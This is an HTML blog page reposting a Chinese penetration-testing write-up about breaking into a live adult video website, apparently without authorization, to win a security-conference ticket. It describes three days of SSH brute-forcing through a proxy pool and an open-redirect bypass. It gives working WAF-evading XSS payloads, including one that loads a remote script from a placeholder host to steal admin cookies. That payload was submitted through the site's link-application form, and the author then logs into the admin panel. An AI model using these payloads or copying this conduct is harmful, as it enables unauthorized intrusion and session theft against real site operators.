@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="yearn">
+
+
+
+<meta name="description" content="原创： MOZA 合天智汇">
+<meta name="keywords" content="waf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="waf">
+<meta property="og:url" content="https://yearn.online/2019/09/07/waf/index.html">
+<meta property="og:site_name" content="绝大部分的不公平来源于自身的能力，别忘记你的情敌正在努力">
+<meta property="og:description" content="原创： MOZA 合天智汇">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-88e88ae12b74aa9af71e73769baab006_hd.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-8d9ef3f8cbbd007aedee2b526a1ebf0a_hd.jpg">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-8ef38dcb69904391e869032390046da7_hd.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-4bd07199cadd0a0058c01fce5ab0707a_hd.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-c496c00ecbe2a4a7a3b697abbeeb0726_hd.png">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-52c82ed9aa4bce456fc931dab5208941_hd.jpg">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-fb46666367c813d6f69a0f59c3c7e767_hd.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-1828b763563e3835bf88537a1528fb24_hd.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-9adf015fb373627916d47a525d447b00_hd.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-6783835540f584e37a3b1e3ea9c45e42_hd.png">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-d0be62a15ce397dca332e1aabe0544ff_hd.jpg">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-0e17f6fe74a81295e2393ff414fcd7d3_hd.png">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-e85f5abbc52b6abfafb4fbba3fa6232d_hd.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-39f5c10e4528db35f0cbf6a1b43f7a4a_hd.png">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-6a805da608e5eebfd0c4a923fb1eb42a_hd.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-f5037dad13d0c951fa2289b8b7a4d1ce_hd.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-16953128fe74c0f7097d64abe6917e3a_hd.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-27a8868da378abc8931b3417ef8c0729_hd.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-3070031fcd863cf05b81573b55b1671a_hd.png">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-6e22617d1dcefafe380472d412636ced_hd.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-5e7300f05d95ec18665aead03a7d32a1_hd.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-dba063f28b503c48b81566b59a5317bd_hd.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-eafa9f40359dd60acce3d4a771ea9c31_hd.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-c2c8fb8c0322161b44731d7f1a1565c2_hd.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-9018c4d4be71a164abbd93cb58da0e90_hd.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-a82a53183ae2d3cd28e90865c783c434_hd.jpg">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-6cb00e5ad5aea9cf8a933ea0b96dfd0f_hd.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-69a54a2ded96965cc84ef8fc2a90ee66_hd.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-205d36559dd4bbca3966cbe7a8005ad4_hd.png">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-4f959432a272d9eafedb24005d564dd3_hd.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-9a0c2889c46c6453fc5a8460f3a5f275_hd.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-b9bc4d11ffa90dbb8b33b8c6e20a07de_hd.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-41b181c51a95a6ec536c07cf6683b3bd_hd.png">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-021e60b11b7f4cead9de23ad3b052396_hd.png">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-fa683363a04df8d48d3ee48d3017527b_hd.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-6f4a5dee1f277e03edf98658c947bb1c_hd.png">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-0c183558be0232c23a54d128435267d1_hd.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-f6e458e125da567e6b7dd0f4fc3a600a_hd.png">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-2b7c91f2a594b9142182235364b786c6_hd.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-287c1e97cca84ab8bc8a8d26071d3bfd_hd.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-dd3ccd19735dd5d2c90c6d14253544b5_hd.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-ea9fdfbc9fa7dceea32f9a1651de1b20_hd.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-26b0247f4654663a150cfd0df24f565e_hd.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-6e96bc204815a8e8fb40d58557a88b92_hd.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-84d732fe1b8a24179517bfd3afd47c40_hd.jpg">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-9fa432909367d1df84285325017cabdb_hd.jpg">
+<meta property="og:updated_time" content="2019-09-07T03:00:26.280Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="waf">
+<meta name="twitter:description" content="原创： MOZA 合天智汇">
+<meta name="twitter:image" content="https://pic3.zhimg.com/80/v2-88e88ae12b74aa9af71e73769baab006_hd.jpg">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="绝大部分的不公平来源于自身的能力，别忘记你的情敌正在努力" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>waf | 绝大部分的不公平来源于自身的能力，别忘记你的情敌正在努力</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?true";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">yearn</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="true" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>Menu</li>
+                        <li>Tags</li>
+                        
+                        <li>Friends</li>
+                        
+                        
+                        <li>About Me</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:1925150398@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/yearnming" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day/">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/benbenben/">benbenben</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/waf/">waf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/今天很沙漠/">今天很沙漠</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/冷淡/">冷淡</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/南岸/">南岸</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/啊哈哈/">啊哈哈</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/大雨连绵/">大雨连绵</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/天气不错，就是眼睛睁不开/">天气不错，就是眼睛睁不开</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/天气好呀/">天气好呀</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/天气真好/">天气真好</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/就很棒/">就很棒</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/就很烦/">就很烦</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/打字很累/">打字很累</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/无聊/">无聊</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/春困/">春困</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/暗/">暗</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞/">漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漫步/">漫步</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/黑夜的柒佰/">黑夜的柒佰</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://xiaoleng.space/">xiaoleng</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于web</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">yearn</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">yearn</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:1925150398@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/yearnming" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+</nav>
+      <div class="body-wrap"><article id="post-waf" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/09/07/waf/" class="article-date">
+      <time datetime="2019-09-07T02:50:23.000Z" itemprop="datePublished">2019-09-07</time>
+</a>
+
+
+
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      waf
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/waf/">waf</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <excerpt in index> 
+
+<p>原创： MOZA 合天智汇</p>
+<a id="more"></a>
+<p>原创： MOZA 合天智汇</p>
+<p><a href="https://zhuanlan.zhihu.com/p/44326395" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/44326395</a></p>
+<p>0*00前言故事的起因:</p>
+<p><img src="https://pic3.zhimg.com/80/v2-88e88ae12b74aa9af71e73769baab006_hd.jpg" alt="img"></p>
+<p>然后</p>
+<p><img src="https://pic3.zhimg.com/80/v2-8d9ef3f8cbbd007aedee2b526a1ebf0a_hd.jpg" alt="img"></p>
+<p>没有想到我为了一张SSC安全峰会的门票，义无反顾的走进上了一条不归路，不是一般的坑…</p>
+<p>0*01信息收集首先打开网站首页是这样子咳咳~为了和谐接下来都会打上重码</p>
+<p><img src="https://pic4.zhimg.com/80/v2-8ef38dcb69904391e869032390046da7_hd.jpg" alt="img"></p>
+<p>我总觉得布局很像是某影视cms，所以打算先识别一下cms。</p>
+<p><img src="https://pic3.zhimg.com/80/v2-4bd07199cadd0a0058c01fce5ab0707a_hd.jpg" alt="img"></p>
+<p>唔，不知道为什么bugscan的在线指纹识别并不能访问，或许是waf，又或许是bugscan自己的黑名单。本地cms识别。</p>
+<p><img src="https://pic3.zhimg.com/80/v2-c496c00ecbe2a4a7a3b697abbeeb0726_hd.png" alt="img"></p>
+<p>没有结果，接下来多地ping一下。</p>
+<p><img src="https://pic2.zhimg.com/80/v2-52c82ed9aa4bce456fc931dab5208941_hd.jpg" alt="img"></p>
+<p>发现cdn，并且发现似乎是美国的服务商，可能bugscan不能识别跟这个有关。绕过cdn找真实ip的方法，我在前面的文章有提到过，这里由于网站不存在注册功能，并且cdn服务商为美国，dns解析记录又没有找到真实ip（由于av域名经常换），所以这里就搁下了，不过到最后我还是拿到了，那是后话了。整个网站都加了waf，扫描起来很难受，而且这种类型的网站不做支持爬虫机制，不能从搜索引擎中获取敏感信息。<br>端口开放信息如下：</p>
+<p><img src="https://pic4.zhimg.com/80/v2-fb46666367c813d6f69a0f59c3c7e767_hd.jpg" alt="img"></p>
+<p>端口开放很有限。目录扫描结果如下：</p>
+<p><img src="https://pic1.zhimg.com/80/v2-1828b763563e3835bf88537a1528fb24_hd.jpg" alt="img"></p>
+<p>意料之中，因为上面的url基本样式都是这样子的：</p>
+<p><img src="https://pic1.zhimg.com/80/v2-9adf015fb373627916d47a525d447b00_hd.jpg" alt="img"></p>
+<p>可以肯定的是基于某影视cms二次开发，并且很有良心，把注册功能去掉了。子域名我并没有打算扫，因为一个如此类型的网站，会经常换域名，不太现实。可能是我的字典太菜了，二级目录并没有扫描出什么结果。</p>
+<p>0*02渗透测试ing经过一番测试，我并没有找到sql注入，并且waf太过严格，大多数时间都只能用手测，实在太痛苦了，但是让我找到了一个很有意思的东西。</p>
+<p><img src="https://pic3.zhimg.com/80/v2-6783835540f584e37a3b1e3ea9c45e42_hd.png" alt="img"></p>
+<p>首先点开第一个，这里有一个友情链接的申请提交表单，我在第一时间想到了xss盲打，然而存在一个问题，如果不成功，会打草惊蛇，导致接下来的渗透变得异常艰难。</p>
+<p><img src="https://pic4.zhimg.com/80/v2-d0be62a15ce397dca332e1aabe0544ff_hd.jpg" alt="img"></p>
+<p>第二个广告联系，这个链接非常坑，首先我点开的时候发现是这样子的：</p>
+<p><img src="https://pic4.zhimg.com/80/v2-0e17f6fe74a81295e2393ff414fcd7d3_hd.png" alt="img"></p>
+<p>我？？</p>
+<p><img src="https://pic2.zhimg.com/80/v2-e85f5abbc52b6abfafb4fbba3fa6232d_hd.jpg" alt="img"></p>
+<p>查看页面源代码看看：</p>
+<p><img src="https://pic3.zhimg.com/80/v2-39f5c10e4528db35f0cbf6a1b43f7a4a_hd.png" alt="img"></p>
+<p>这不按照套路出牌啊？难道联系站长还得黑科技？？？在这里我琢磨了很久，查看链接跳转的确没啥毛病，但我总觉得不对劲，然后脑子一抽想起了那个美国的cdn，掏出了我珍藏多年的翻墙梯，重新点了一次广告联系。</p>
+<p><img src="https://pic3.zhimg.com/80/v2-6a805da608e5eebfd0c4a923fb1eb42a_hd.jpg" alt="img"></p>
+<p>？？这年头，连找站长都必须不是国内ip了吗…我没有先着急加qq。继续点开第三个视频删除，没想到还能删除视频？</p>
+<p><img src="https://pic3.zhimg.com/80/v2-f5037dad13d0c951fa2289b8b7a4d1ce_hd.jpg" alt="img"></p>
+<p>唔，事实证明我还是太年轻了。也算是有收获，得到了一个邮箱。整站做了静态处理，没有交互的参数，整个渗透似乎到这里就陷入了死路，我甚至写了个爬虫，递归性的爬了一整个网站，然而没有发现…突然想起可以扫c段，但是我又发现没有找到真实ip，所以压根不存在C段这个东西。吃个辣条整理一下思路，ssh可以尝试爆破一波，直接上神器</p>
+<p><img src="https://pic3.zhimg.com/80/v2-16953128fe74c0f7097d64abe6917e3a_hd.jpg" alt="img"></p>
+<p>然后，我就被banip了有waf的爆破比较麻烦，但没关系，我有代理池，时间我也有的是。然后就在折磨中爆破了三天…，并没有啥结果…。</p>
+<p>0*03路途坎坷在失落中点开了目标站点，让我脑子顿时清醒了起来，他居然又换网址了，并且贴心的给了提示。</p>
+<p><img src="https://pic2.zhimg.com/80/v2-27a8868da378abc8931b3417ef8c0729_hd.jpg" alt="img"></p>
+<p>我看了一下源代码</p>
+<p><img src="https://pic3.zhimg.com/80/v2-3070031fcd863cf05b81573b55b1671a_hd.png" alt="img"></p>
+<p>是一个跳转链接，不过很奇怪没有写成超链接的形式，而是直接服务端跳转。测试一下是否存在url跳转漏洞，直接在index.php上get传值过去。</p>
+<p><img src="https://pic2.zhimg.com/80/v2-6e22617d1dcefafe380472d412636ced_hd.jpg" alt="img"></p>
+<p>很尴尬并没有跳转成功，而是正常跳转到了目标新的网址。由于所有的错误都会正常跳转，导致无法通过错误信息调整payload，所以在这里我进行了大量关于url跳转漏洞的绕过尝试：首先去掉协议:</p>
+<p><img src="https://pic2.zhimg.com/80/v2-5e7300f05d95ec18665aead03a7d32a1_hd.jpg" alt="img"></p>
+<p>无果，去掉www：</p>
+<p><img src="https://pic2.zhimg.com/80/v2-dba063f28b503c48b81566b59a5317bd_hd.jpg" alt="img"></p>
+<p>将域名换成ip地址:</p>
+<p><img src="https://pic2.zhimg.com/80/v2-eafa9f40359dd60acce3d4a771ea9c31_hd.jpg" alt="img"></p>
+<p>更换协议</p>
+<p><img src="https://pic3.zhimg.com/80/v2-c2c8fb8c0322161b44731d7f1a1565c2_hd.jpg" alt="img"></p>
+<p>尝试通过添加多余的”/“(%2F)符号，再对”.”两次url编码成”%252E”绕过代码中对域名后”.com”的切割</p>
+<p><img src="https://pic1.zhimg.com/80/v2-9018c4d4be71a164abbd93cb58da0e90_hd.jpg" alt="img"></p>
+<p>尝试”;”,”/“, “\”, “?”, “:”, “@”,”=”, “&amp;”, “.”特殊字符绕过</p>
+<p><img src="https://pic1.zhimg.com/80/v2-a82a53183ae2d3cd28e90865c783c434_hd.jpg" alt="img"></p>
+<p>经过了非常消磨耐性与想象力的过程，我成功测试成功payload<a href="https://link.zhihu.com/?target=https%3A//www.xxx.com/index.php%3Flink%3Dhttps%3A//www.xxxx.com" target="_blank" rel="noopener">https://www.xxx.com/index.php?link=https://www.xxxx.com</a>\?<a href="https://link.zhihu.com/?target=https%3A//www.baidu.com/." target="_blank" rel="noopener">https://www.baidu.com/.</a>.</p>
+<p><img src="https://pic4.zhimg.com/80/v2-6cb00e5ad5aea9cf8a933ea0b96dfd0f_hd.jpg" alt="img"></p>
+<p>实在很迷，关于url跳转漏洞的测试，有机会可以总结一下。但我突然发现一个问题，url跳转成功似乎也没啥卵用，我总不能拿去钓鱼站长，因为不知道站点的后台地址，无法模仿出钓鱼页面。我内心：</p>
+<p><img src="https://pic3.zhimg.com/80/v2-69a54a2ded96965cc84ef8fc2a90ee66_hd.jpg" alt="img"></p>
+<p>0*04峰回路转Link参数是采用服务端跳转的方式，并且没有引用js脚本，所以基本可以肯定没有xss漏洞，但是在这时候我又发现了一个信息。</p>
+<p><img src="https://pic1.zhimg.com/80/v2-205d36559dd4bbca3966cbe7a8005ad4_hd.png" alt="img"></p>
+<p>他更新了，我在他这个版本里面没有发现搜索功能，但是先前的版本很可能会存在，而且更新的一般都是框架型的更新，比如说模板之类的，实际的底层代码很多都没变，既然index.php存在link参数，那么跟搜索相关的参数比说:?s，?search，?sou等等。掏出珍藏已久的关键字执行字典，丢进在自己写的扫描脚本，加上代理池，坐等结果。</p>
+<p><img src="https://pic4.zhimg.com/80/v2-4f959432a272d9eafedb24005d564dd3_hd.jpg" alt="img"></p>
+<p>s参数存活我们去看看究竟是个什么功能。</p>
+<p><img src="https://pic2.zhimg.com/80/v2-9a0c2889c46c6453fc5a8460f3a5f275_hd.jpg" alt="img"></p>
+<p>确定是搜索功能，并且为什么我搜我id会有一个不可描述的视频…我们可以尝试能否挖到反射型xss或者搜索型文本框注入。</p>
+<p>0*05 by bass首先是xss：</p>
+<p><img src="https://pic3.zhimg.com/80/v2-b9bc4d11ffa90dbb8b33b8c6e20a07de_hd.jpg" alt="img"></p>
+<p>查看源码，可知我们在strong标签。</p>
+<p><img src="https://pic2.zhimg.com/80/v2-41b181c51a95a6ec536c07cf6683b3bd_hd.png" alt="img"></p>
+<p>过滤了相应的关键字，尖括号等，尝试关键字大小写与尖括号重复绕过。（失败）</p>
+<p><img src="https://pic3.zhimg.com/80/v2-021e60b11b7f4cead9de23ad3b052396_hd.png" alt="img"></p>
+<p>发现并没有过滤双引号，单引号，\</p>
+<p><img src="https://pic4.zhimg.com/80/v2-fa683363a04df8d48d3ee48d3017527b_hd.jpg" alt="img"></p>
+<p>尝试未递归绕过</p>
+<p><img src="https://pic1.zhimg.com/80/v2-6f4a5dee1f277e03edf98658c947bb1c_hd.png" alt="img"></p>
+<p>这个输出点并没有在标签内，并且过滤了&lt;&gt;尝试各种编码没办法绕过，也就是无法逃匿<strong>标签，遂放弃此输出点。但是我们还有另一个输出点</strong></p>
+<p><img src="https://pic2.zhimg.com/80/v2-0c183558be0232c23a54d128435267d1_hd.jpg" alt="img"></p>
+<p>先右键源码看一下</p>
+<p><img src="https://pic3.zhimg.com/80/v2-f6e458e125da567e6b7dd0f4fc3a600a_hd.png" alt="img"></p>
+<p>&lt;inputid=”wd” name=”wd” class=”search-inputacInput” value=”moza” type=”text”&gt;思路很清楚，由于没有过滤”我们可以闭合value属性，然后通过一些事件去触发弹窗。<br>但是让我始料未及的是</p>
+<p><img src="https://pic3.zhimg.com/80/v2-2b7c91f2a594b9142182235364b786c6_hd.jpg" alt="img"></p>
+<p>Input的小括号被过滤了。我们来构造一下原始payloadmoza”autofocus onfocus=alert(1)a=”代码很简单插入一个事件与一个属性，其中onfocus事件在对象获得焦点时发生，autofocus属性规定当页面加载时input元素应该自动获得焦点。简单来说，就是它会自动获取焦点然后执行onfocus=xxxx中的xxxx。但是()被过滤，采用location=url模式，可以将括号写为%28%29所以payload变成这个样子moza”autofocus onfocus=location=’javascript:alert%25281%2529’a=”其中%25为”%”的url编码。然而由于此处输出点过滤单引号</p>
+<p><img src="https://pic2.zhimg.com/80/v2-287c1e97cca84ab8bc8a8d26071d3bfd_hd.jpg" alt="img"></p>
+<p>所以我们换一种方式传入，用this.name进行传值,所以最后的payload变成了moza”autofocusname=javascript:alert%25281%2529 onfocus=location=this.name a=”令人窒息的是过滤了script却没有过滤javascript，故这里就不用在做编码绕过。然后我们就成功弹窗了。</p>
+<p><img src="https://pic2.zhimg.com/80/v2-dd3ccd19735dd5d2c90c6d14253544b5_hd.jpg" alt="img"></p>
+<p>当然弹窗还不行，我们需要用到xss平台，让我们来引入外链盗取后台地址与及cookie。moza”name=javasCript:s=document.createElement%2528”script”%2529;s.src=”<a href="https://link.zhihu.com/?target=http%3A//xxxxxx.com/xxx.js" target="_blank" rel="noopener">http://xxxxxx.com/xxx.js</a>“;document.body.appendChild%2528s%2529;autofocus onfocus=location=this.name a=”<br>这里有两个思路。第一个是加他qq然后骗他点击。第二个就是友链申请，直接丢上去。第一种感觉有点难套路，我们用第二种</p>
+<p><img src="https://pic1.zhimg.com/80/v2-ea9fdfbc9fa7dceea32f9a1651de1b20_hd.jpg" alt="img"></p>
+<p>然后我就去吃辣条了。两小时后收到邮件。</p>
+<p><img src="https://pic3.zhimg.com/80/v2-26b0247f4654663a150cfd0df24f565e_hd.jpg" alt="img"></p>
+<p>并且在这里拿到了真实的ip，说实话这后台地址我不想吐槽…/h0ut4is_admin/ 不得不服</p>
+<p><img src="https://pic3.zhimg.com/80/v2-6e96bc204815a8e8fb40d58557a88b92_hd.jpg" alt="img"></p>
+<p>最后登陆后台</p>
+<p><img src="https://pic1.zhimg.com/80/v2-84d732fe1b8a24179517bfd3afd47c40_hd.jpg" alt="img"></p>
+<p>还是打码吧，要和谐，没有打算getshell，太累了。最后我的门票也到手了。</p>
+<p><img src="https://pic4.zhimg.com/80/v2-9fa432909367d1df84285325017cabdb_hd.jpg" alt="img"></p>
+<p>0*06总结在渗透测试过程中，注意收集信息，并且需要有足够的耐心，共勉。</p>
+</excerpt>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>Title:</span><a href="/2019/09/07/waf/">waf</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage">yearn</a></p>
+        <p><span>Created:</span>2019-09-07, 10:50:23</p>
+        <p><span>Updated:</span>2019-09-07, 11:00:26</p>
+        <p>
+            <span>Full URL:</span><a class="post-url" href="/2019/09/07/waf/" title="waf">https://yearn.online/2019/09/07/waf/</a>
+            <span class="copy-path" data-clipboard-text="From https://yearn.online/2019/09/07/waf/　　By yearn" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+        </p>
+    </div>
+
+
+
